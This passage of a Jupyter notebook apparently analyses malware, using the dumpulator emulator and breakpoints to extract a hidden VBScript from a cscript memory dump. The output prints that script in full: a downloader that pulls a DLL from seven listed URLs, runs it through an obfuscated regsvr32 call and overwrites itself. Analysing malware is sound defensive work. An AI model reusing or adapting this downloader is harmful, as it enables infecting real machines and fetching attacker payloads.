        <span class="bp">self</span><span class="o">.</span><span class="n">set_exception_hook</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">exception_hook</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">set_breakpoint</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">address</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="nb">int</span><span class="p">,</span> <span class="nb">str</span><span class="p">],</span> <span class="n">callback</span><span class="p">:</span> <span class="n">Callable</span><span class="p">[[],</span> <span class="kc">None</span><span class="p">]):</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
            <span class="n">module_name</span><span class="p">,</span> <span class="n">export_name</span> <span class="o">=</span> <span class="n">address</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">":"</span><span class="p">)</span>
            <span class="n">module</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">modules</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">module_name</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">module</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                <span class="k">raise</span> <span class="ne">KeyError</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Module '</span><span class="si">{</span><span class="n">module_name</span><span class="si">}</span><span class="s2">' not found"</span><span class="p">)</span>
            <span class="n">export</span> <span class="o">=</span> <span class="n">module</span><span class="o">.</span><span class="n">find_export</span><span class="p">(</span><span class="n">export_name</span><span class="p">)</span>
            <span class="k">if</span> <span class="n">export</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                <span class="k">raise</span> <span class="ne">KeyError</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Export '</span><span class="si">{</span><span class="n">export_name</span><span class="si">}</span><span class="s2">' not found in module '</span><span class="si">{</span><span class="n">module_name</span><span class="si">}</span><span class="s2">'"</span><span class="p">)</span>
            <span class="k">assert</span> <span class="n">export</span><span class="o">.</span><span class="n">forward</span> <span class="ow">is</span> <span class="kc">None</span>
            <span class="n">address</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="n">export</span><span class="o">.</span><span class="n">address</span>
        <span class="k">assert</span> <span class="n">address</span> <span class="ow">not</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span><span class="p">[</span><span class="n">address</span><span class="p">]</span> <span class="o">=</span> <span class="n">BreakpointInfo</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="bp">self</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="mi">1</span><span class="p">),</span> <span class="n">callback</span><span class="p">)</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">address</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xCC</span><span class="s2">"</span><span class="p">)</span>

    <span class="k">def</span> <span class="nf">remove_breakpoint</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">address</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
        <span class="k">assert</span> <span class="n">address</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span>
        <span class="n">bp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span><span class="p">[</span><span class="n">address</span><span class="p">]</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">bp</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">bp</span><span class="o">.</span><span class="n">original</span><span class="p">)</span>
        <span class="k">del</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span><span class="p">[</span><span class="n">address</span><span class="p">]</span>

    <span class="k">def</span> <span class="nf">exception_hook</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">exception</span><span class="p">:</span> <span class="n">ExceptionInfo</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">int</span><span class="p">]:</span>
        <span class="k">if</span> <span class="n">exception</span><span class="o">.</span><span class="n">type</span> <span class="o">==</span> <span class="n">ExceptionType</span><span class="o">.</span><span class="n">Interrupt</span><span class="p">:</span>
            <span class="k">if</span> <span class="n">exception</span><span class="o">.</span><span class="n">interrupt_number</span> <span class="o">==</span> <span class="mi">3</span><span class="p">:</span>  <span class="c1"># int3</span>
                <span class="c1"># Find the breakpoint</span>
                <span class="n">bp</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">bp</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Unexpected int3 at </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span><span class="p">)</span><span class="si">}</span><span class="s2">, ignoring"</span><span class="p">)</span>
                    <span class="k">return</span> <span class="kc">None</span>
                <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Reached breakpoint at </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="n">bp</span><span class="o">.</span><span class="n">address</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>

                <span class="c1"># Execute the breakpoint callback</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span> <span class="o">-=</span> <span class="mi">1</span>
                <span class="n">bp</span><span class="o">.</span><span class="n">callback</span><span class="p">()</span>

                <span class="c1"># Restore the breakpoint if it wasn't removed</span>
                <span class="k">if</span> <span class="n">bp</span><span class="o">.</span><span class="n">address</span> <span class="ow">in</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoints</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="s1">'Restoring breakpoint'</span><span class="p">)</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">bp</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="n">bp</span><span class="o">.</span><span class="n">original</span><span class="p">)</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">eflags</span> <span class="o">|=</span> <span class="mh">0x100</span>  <span class="c1"># trap flag</span>
                    <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoint_step</span> <span class="o">=</span> <span class="n">bp</span>

                <span class="c1"># Resume execution at the CIP (the callback might change it)</span>
                <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span>
            <span class="k">elif</span> <span class="n">exception</span><span class="o">.</span><span class="n">interrupt_number</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>  <span class="c1"># single step</span>
                <span class="k">if</span> <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoint_step</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
                    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">"Unexpected single step at </span><span class="si">{</span><span class="nb">hex</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span><span class="p">)</span><span class="si">}</span><span class="s2">"</span><span class="p">)</span>
                    <span class="k">return</span> <span class="kc">None</span>

                <span class="nb">print</span><span class="p">(</span><span class="s2">"Single stepping after breakpoint"</span><span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">eflags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="mh">0x100</span>  <span class="c1"># remove trap flag</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">_breakpoint_step</span><span class="o">.</span><span class="n">address</span><span class="p">,</span> <span class="sa">b</span><span class="s2">"</span><span class="se">\xCC</span><span class="s2">"</span><span class="p">)</span>
                <span class="bp">self</span><span class="o">.</span><span class="n">_breakpoint_step</span> <span class="o">=</span> <span class="kc">None</span>
                <span class="k">return</span> <span class="bp">self</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span>

        <span class="c1"># Let the original exception handler do this</span>
        <span class="k">return</span> <span class="kc">None</span>

    
    
    
<span class="nd">@syscall</span>
<span class="k">def</span> <span class="nf">ZwAllocateVirtualMemory</span><span class="p">(</span><span class="n">dp</span><span class="p">:</span> <span class="n">Dumpulator</span><span class="p">,</span>
                            <span class="n">ProcessHandle</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">HANDLE</span><span class="p">,</span> <span class="n">SAL</span><span class="p">(</span><span class="s2">"_In_"</span><span class="p">)],</span>
                            <span class="n">BaseAddress</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">P</span><span class="p">[</span><span class="n">PVOID</span><span class="p">],</span> <span class="n">SAL</span><span class="p">(</span><span class="s2">"_Inout_ _At_(*BaseAddress, _Readable_bytes_(*RegionSize) _Writable_bytes_(*RegionSize) _Post_readable_byte_size_(*RegionSize))"</span><span class="p">)],</span>
                            <span class="n">ZeroBits</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">ULONG_PTR</span><span class="p">,</span> <span class="n">SAL</span><span class="p">(</span><span class="s2">"_In_"</span><span class="p">)],</span>
                            <span class="n">RegionSize</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">P</span><span class="p">[</span><span class="n">SIZE_T</span><span class="p">],</span> <span class="n">SAL</span><span class="p">(</span><span class="s2">"_Inout_"</span><span class="p">)],</span>
                            <span class="n">AllocationType</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">ULONG</span><span class="p">,</span> <span class="n">SAL</span><span class="p">(</span><span class="s2">"_In_"</span><span class="p">)],</span>
                            <span class="n">Protect</span><span class="p">:</span> <span class="n">Annotated</span><span class="p">[</span><span class="n">ULONG</span><span class="p">,</span> <span class="n">SAL</span><span class="p">(</span><span class="s2">"_In_"</span><span class="p">)]</span>
                            <span class="p">):</span>
    <span class="k">assert</span> <span class="n">ZeroBits</span> <span class="o">==</span> <span class="mi">0</span>
    <span class="k">assert</span> <span class="n">ProcessHandle</span> <span class="o">==</span> <span class="n">dp</span><span class="o">.</span><span class="n">NtCurrentProcess</span><span class="p">()</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">read_ptr</span><span class="p">(</span><span class="n">BaseAddress</span><span class="o">.</span><span class="n">ptr</span><span class="p">)</span>
    <span class="n">base</span> <span class="o">=</span> <span class="n">round_to_pages</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
    <span class="k">assert</span> <span class="n">base</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span> <span class="o">==</span> <span class="mi">0</span>
    <span class="n">size</span> <span class="o">=</span> <span class="n">round_to_pages</span><span class="p">(</span><span class="n">dp</span><span class="o">.</span><span class="n">read_ptr</span><span class="p">(</span><span class="n">RegionSize</span><span class="o">.</span><span class="n">ptr</span><span class="p">))</span>
    <span class="c1">#assert size != 0</span>
    <span class="n">protect</span> <span class="o">=</span> <span class="n">MemoryProtect</span><span class="p">(</span><span class="n">Protect</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">AllocationType</span> <span class="o">==</span> <span class="n">MEM_COMMIT</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">base</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">find_free</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
            <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">reserve</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">protect</span><span class="p">)</span>
            <span class="n">BaseAddress</span><span class="o">.</span><span class="n">write_ptr</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
            <span class="n">RegionSize</span><span class="o">.</span><span class="n">write_ptr</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="c1">#print(f"commit({hex(base)}[{hex(size)}], {protect})")</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">commit</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">protect</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">AllocationType</span> <span class="o">==</span> <span class="n">MEM_RESERVE</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">base</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">find_free</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
            <span class="n">BaseAddress</span><span class="o">.</span><span class="n">write_ptr</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
            <span class="n">RegionSize</span><span class="o">.</span><span class="n">write_ptr</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="c1">#print(f"reserve({hex(base)}[{hex(size)}], {protect})")</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">reserve</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">protect</span><span class="p">)</span>
    <span class="k">elif</span> <span class="n">AllocationType</span> <span class="o">==</span> <span class="n">MEM_COMMIT</span> <span class="o">|</span> <span class="n">MEM_RESERVE</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">base</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">base</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">find_free</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
            <span class="n">BaseAddress</span><span class="o">.</span><span class="n">write_ptr</span><span class="p">(</span><span class="n">base</span><span class="p">)</span>
            <span class="n">RegionSize</span><span class="o">.</span><span class="n">write_ptr</span><span class="p">(</span><span class="n">size</span><span class="p">)</span>
        <span class="c1">#print(f"reserve+commit({hex(base)}[{hex(size)}], {protect})")</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">reserve</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">size</span><span class="p">,</span> <span class="n">protect</span><span class="p">)</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">memory</span><span class="o">.</span><span class="n">commit</span><span class="p">(</span><span class="n">base</span><span class="p">,</span> <span class="n">size</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">raise</span> <span class="ne">NotImplementedError</span><span class="p">()</span>
    <span class="k">return</span> <span class="n">STATUS_SUCCESS</span>


<span class="n">dp</span> <span class="o">=</span> <span class="n">MyDumpulator</span><span class="p">(</span><span class="s2">"/tmp/cscript_nopped.dmp"</span><span class="p">,</span> <span class="n">quiet</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">rteval_bp</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">seen</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">"hit bp"</span><span class="p">)</span>
    <span class="c1">#print(dp.read_str(dp.regs.ecx, encoding='utf-16'))</span>
   

    <span class="k">if</span> <span class="n">seen</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">seen</span><span class="p">)</span>
        <span class="n">out</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">''</span>
        <span class="n">ptr</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ecx</span>
        <span class="n">c</span> <span class="o">=</span> <span class="mi">0</span>
        <span class="k">while</span> <span class="n">c</span> <span class="o">&lt;</span> <span class="mi">100000000</span><span class="p">:</span>
            <span class="n">c</span> <span class="o">+=</span> <span class="mi">1</span>
            <span class="n">ptr_byte</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">ptr</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
            <span class="n">out</span> <span class="o">+=</span> <span class="n">ptr_byte</span>
            <span class="k">if</span> <span class="n">ptr_byte</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">:</span>
                <span class="k">if</span> <span class="n">dp</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">ptr</span><span class="o">+</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span> <span class="o">==</span> <span class="sa">b</span><span class="s1">'</span><span class="se">\x00</span><span class="s1">'</span><span class="p">:</span>
                    <span class="k">break</span>
            <span class="n">ptr</span> <span class="o">+=</span> <span class="mi">1</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">"== SCRIPT =="</span><span class="p">)</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">out</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">'utf-16'</span><span class="p">)</span><span class="o">.</span><span class="n">replace</span><span class="p">(</span><span class="s1">'</span><span class="se">\r</span><span class="s1">'</span><span class="p">,</span><span class="s1">'</span><span class="se">\n</span><span class="s1">'</span><span class="p">))</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">remove_breakpoint</span><span class="p">(</span><span class="mh">0x7021074D</span><span class="p">)</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">eip</span> <span class="o">=</span> <span class="mh">0x13371337</span>
        <span class="n">dp</span><span class="o">.</span><span class="n">stop</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="n">seen</span><span class="p">)</span>
        <span class="n">seen</span> <span class="o">=</span> <span class="kc">True</span>
        

<span class="n">dp</span><span class="o">.</span><span class="n">set_breakpoint</span><span class="p">(</span><span class="mh">0x7021074D</span><span class="p">,</span> <span class="n">rteval_bp</span><span class="p">)</span>


<span class="n">ptr_script_bytes</span> <span class="o">=</span> <span class="n">dp</span><span class="o">.</span><span class="n">allocate</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">script_bytes</span><span class="p">),</span><span class="n">page_align</span> <span class="o">=</span> <span class="kc">True</span><span class="p">)</span>
<span class="n">dp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">ptr_script_bytes</span><span class="p">,</span> <span class="n">script_bytes</span><span class="p">)</span>
                               
<span class="n">dp</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ecx</span> <span class="o">=</span> <span class="n">ptr_script_bytes</span>

<span class="n">dp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dp</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">ecx</span><span class="p">,</span> <span class="n">script_bytes</span><span class="p">)</span>



<span class="n">dp</span><span class="o">.</span><span class="n">start</span><span class="p">(</span><span class="n">dp</span><span class="o">.</span><span class="n">regs</span><span class="o">.</span><span class="n">cip</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="mh">0x13371337</span><span class="p">)</span>
         
         
         
         
</pre></div>

    </div>
</div>
</div>

<div class="output_wrapper">
<div class="output">

<div class="output_area">

<div class="output_subarea output_stream output_stdout output_text">
<pre>interrupt 3 (#BP, Breakpoint), cip = 0x7021074e, cs = 0x23
Reached breakpoint at 0x7021074d
hit bp
False
Restoring breakpoint
interrupt 1 (#DB, Debug), cip = 0x7021074f, cs = 0x23
Single stepping after breakpoint
interrupt 3 (#BP, Breakpoint), cip = 0x7021074e, cs = 0x23
Reached breakpoint at 0x7021074d
hit bp
True
== SCRIPT ==
urlcount=1
set fsobject=createobject("scripting.filesystemobject")
currentdir=fsobject.getparentfoldername(wscript.scriptfullname)
set request=createobject("winhttp.winhttprequest.5.1")
set file=wscript.createobject("shell.application")
set strout=createobject("adodb.stream")
useragent="mozilla/5.0 (windows nt 6.1; wow64; rv:58.0) gecko/20100101 firefox/58.0"
ouch= chr(115-1)+"e"+"gs"&amp;"v"+chr(113+1)+"3"+"2."+chr(101)+"x"+chr(101)+" " + ""
pat3= currentdir+"\"+fsobject.gettempname+".dll"
loiu=ouch+ """"+ pat3 + """"
set triplett=createobject("wscript.shell")
url1 = "https://penshorn.org/admin/Ses8712iGR8du/"
url2 = "https://bbvoyage.com/useragreement/ElKHvb4QIQqSrh6Hqm/"
url3 = "https://www.gomespontes.com.br/logs/pd/"
url4 = "https://portalevolucao.com/GerarBoleto/fLIOoFbFs1jHtX/"
url5 = "http://ozmeydan.com/cekici/9/"
url6 = "http://softwareulike.com/cWIYxWMPkK/"
url7 = "http://wrappixels.com/wp-admin/GdIA2oOQEiO5G/"
do
call dow
loop  while urlcount&lt;8
public function dow()
on error resume next
select case urlcount
case 1
downstr=url1
case 2
downstr=url2
case 3
downstr=url3
case 4
downstr=url4
case 5
downstr=url5
case 6
downstr=url6
case 7
downstr=url7
end select
request.open "get",downstr,false
request.send
If Err.Number&lt;&gt;0 then
urlcount=urlcount+1
else
strout.open
strout.type=1
if vare=0 then
cad=1
else
far=2
end if
strout.write (request.responsebody)
if roum=0 then
sio=sio+1
else
end if
strout.savetofile pat3
strout.close
armour = "samcom."
set fsobject=createobject("scripting.filesystemobject")
Set f = fsobject.GetFile(pat3)
GetFileSize = clng(f.size/1024)
If GetFileSize &gt; 150 Then
call roize
urlcount = 8
else
pat3= currentdir+"\"+fsobject.gettempname+".dll"
loiu=ouch+ """"+ pat3 + """"
urlcount=urlcount+1
end if
end if
end function
public function roize
if derti=0 then
sem=sem+1
else
end if
urlcount = 8
triplett.run (loiu),0,true
cor = "samo"
set fsobject=createobject("scripting.filesystemobject")
set textstream = fsobject.createtextfile(""+wscript.scriptfullname+"")
textstream.write ("badum tss")
if rotate = 12 then
sable = 54 + 22
else
routtt = "carry"
end if
end function

interrupt 3 (#BP, Breakpoint), cip = 0x7021074e, cs = 0x23
Unexpected int3 at 0x7021074e, ignoring
Exception thrown during syscall implementation, stopping emulation!
forced exit memory operation 21 of 0x4fe2[0x1] = 0x0
</pre>
</div>
</div>

<div class="output_area">

<div class="output_subarea output_text output_error">
<pre>
<span class="ansi-red-fg">---------------------------------------------------------------------------</span>
<span class="ansi-red-fg">NotImplementedError</span>                       Traceback (most recent call last)
<span class="ansi-green-fg">&lt;ipython-input-8-cb4a538155d4&gt;</span> in <span class="ansi-cyan-fg">&lt;module&gt;</span>
<span class="ansi-green-intense-fg ansi-bold">    170</span> 
<span class="ansi-green-intense-fg ansi-bold">    171</span> 
<span class="ansi-green-fg">--&gt; 172</span><span class="ansi-red-fg"> </span>dp<span class="ansi-blue-fg">.</span>start<span class="ansi-blue-fg">(</span>dp<span class="ansi-blue-fg">.</span>regs<span class="ansi-blue-fg">.</span>cip<span class="ansi-blue-fg">,</span> end<span class="ansi-blue-fg">=</span><span class="ansi-cyan-fg">0x13371337</span><span class="ansi-blue-fg">)</span>
<span class="ansi-green-intense-fg ansi-bold">    173</span> 
<span class="ansi-green-intense-fg ansi-bold">    174</span> 

<span class="ansi-green-fg">~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py</span> in <span class="ansi-cyan-fg">start</span><span class="ansi-blue-fg">(self, begin, end, count)</span>
<span class="ansi-green-intense-fg ansi-bold">   1110</span>             <span class="ansi-green-fg">except</span> UcError <span class="ansi-green-fg">as</span> err<span class="ansi-blue-fg">:</span>
<span class="ansi-green-intense-fg ansi-bold">   1111</span>                 <span class="ansi-green-fg">if</span> self<span class="ansi-blue-fg">.</span>kill_me <span class="ansi-green-fg">is</span> <span class="ansi-green-fg">not</span> <span class="ansi-green-fg">None</span> <span class="ansi-green-fg">and</span> type<span class="ansi-blue-fg">(</span>self<span class="ansi-blue-fg">.</span>kill_me<span class="ansi-blue-fg">)</span> <span class="ansi-green-fg">is</span> <span class="ansi-green-fg">not</span> UcError<span class="ansi-blue-fg">:</span>
<span class="ansi-green-fg">-&gt; 1112</span><span class="ansi-red-fg">                     </span><span class="ansi-green-fg">raise</span> self<span class="ansi-blue-fg">.</span>kill_me
<span class="ansi-green-intense-fg ansi-bold">   1113</span>                 <span class="ansi-green-fg">if</span> self<span class="ansi-blue-fg">.</span>_exception<span class="ansi-blue-fg">.</span>type <span class="ansi-blue-fg">!=</span> ExceptionType<span class="ansi-blue-fg">.</span>NoException<span class="ansi-blue-fg">:</span>
<span class="ansi-green-intense-fg ansi-bold">   1114</span>                     <span class="ansi-red-fg"># Handle the exception outside of the except handler</span>

<span class="ansi-green-fg">~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/unicorn/unicorn.py</span> in <span class="ansi-cyan-fg">wrapper</span><span class="ansi-blue-fg">(self, *args, **kwargs)</span>
<span class="ansi-green-intense-fg ansi-bold">    390</span>         """
<span class="ansi-green-intense-fg ansi-bold">    391</span>         <span class="ansi-green-fg">try</span><span class="ansi-blue-fg">:</span>
<span class="ansi-green-fg">--&gt; 392</span><span class="ansi-red-fg">             </span><span class="ansi-green-fg">return</span> func<span class="ansi-blue-fg">(</span>self<span class="ansi-blue-fg">,</span> <span class="ansi-blue-fg">*</span>args<span class="ansi-blue-fg">,</span> <span class="ansi-blue-fg">**</span>kwargs<span class="ansi-blue-fg">)</span>
<span class="ansi-green-intense-fg ansi-bold">    393</span>         <span class="ansi-green-fg">except</span> Exception <span class="ansi-green-fg">as</span> e<span class="ansi-blue-fg">:</span>
<span class="ansi-green-intense-fg ansi-bold">    394</span>             <span class="ansi-red-fg"># If multiple hooks raise exceptions, just use the first one</span>

<span class="ansi-green-fg">~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/unicorn/unicorn.py</span> in <span class="ansi-cyan-fg">_hook_insn_syscall_cb</span><span class="ansi-blue-fg">(self, handle, user_data)</span>
<span class="ansi-green-intense-fg ansi-bold">    713</span>         <span class="ansi-red-fg"># call user's callback with self object</span>
<span class="ansi-green-intense-fg ansi-bold">    714</span>         <span class="ansi-blue-fg">(</span>cb<span class="ansi-blue-fg">,</span> data<span class="ansi-blue-fg">)</span> <span class="ansi-blue-fg">=</span> self<span class="ansi-blue-fg">.</span>_callbacks<span class="ansi-blue-fg">[</span>user_data<span class="ansi-blue-fg">]</span>
<span class="ansi-green-fg">--&gt; 715</span><span class="ansi-red-fg">         </span>cb<span class="ansi-blue-fg">(</span>self<span class="ansi-blue-fg">,</span> data<span class="ansi-blue-fg">)</span>
<span class="ansi-green-intense-fg ansi-bold">    716</span> 
<span class="ansi-green-intense-fg ansi-bold">    717</span>     <span class="ansi-blue-fg">@</span>_catch_hook_exception

<span class="ansi-green-fg">~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py</span> in <span class="ansi-cyan-fg">_hook_syscall</span><span class="ansi-blue-fg">(uc, dp)</span>
<span class="ansi-green-intense-fg ansi-bold">   1619</span>             <span class="ansi-green-fg">except</span> Exception <span class="ansi-green-fg">as</span> exc<span class="ansi-blue-fg">:</span>
<span class="ansi-green-intense-fg ansi-bold">   1620</span>                 dp<span class="ansi-blue-fg">.</span>error<span class="ansi-blue-fg">(</span><span class="ansi-blue-fg">f"Exception thrown during syscall implementation, stopping emulation!"</span><span class="ansi-blue-fg">)</span>
<span class="ansi-green-fg">-&gt; 1621</span><span class="ansi-red-fg">                 </span><span class="ansi-green-fg">raise</span> dp<span class="ansi-blue-fg">.</span>raise_kill<span class="ansi-blue-fg">(</span>exc<span class="ansi-blue-fg">)</span> <span class="ansi-green-fg">from</span> <span class="ansi-green-fg">None</span>
<span class="ansi-green-intense-fg ansi-bold">   1622</span>             <span class="ansi-green-fg">finally</span><span class="ansi-blue-fg">:</span>
<span class="ansi-green-intense-fg ansi-bold">   1623</span>                 dp<span class="ansi-blue-fg">.</span>sequence_id <span class="ansi-blue-fg">+=</span> <span class="ansi-cyan-fg">1</span>

<span class="ansi-green-fg">~/.pyenv/versions/3.9.5/lib/python3.9/site-packages/dumpulator/dumpulator.py</span> in <span class="ansi-cyan-fg">_hook_syscall</span><span class="ansi-blue-fg">(uc, dp)</span>
<span class="ansi-green-intense-fg ansi-bold">   1601</span>             dp<span class="ansi-blue-fg">.</span>info<span class="ansi-blue-fg">(</span><span class="ansi-blue-fg">")"</span><span class="ansi-blue-fg">)</span>
<span class="ansi-green-intense-fg ansi-bold">   1602</span>             <span class="ansi-green-fg">try</span><span class="ansi-blue-fg">:</span>
<span class="ansi-green-fg">-&gt; 1603</span><span class="ansi-red-fg">                 </span>status <span class="ansi-blue-fg">=</span> syscall_impl<span class="ansi-blue-fg">(</span>dp<span class="ansi-blue-fg">,</span> <span class="ansi-blue-fg">*</span>args<span class="ansi-blue-fg">)</span>
<span class="ansi-green-intense-fg ansi-bold">   1604</span>                 <span class="ansi-green-fg">if</span> isinstance<span class="ansi-blue-fg">(</span>status<span class="ansi-blue-fg">,</span> ExceptionInfo<span class="ansi-blue-fg">)</span><span class="ansi-blue-fg">:</span>
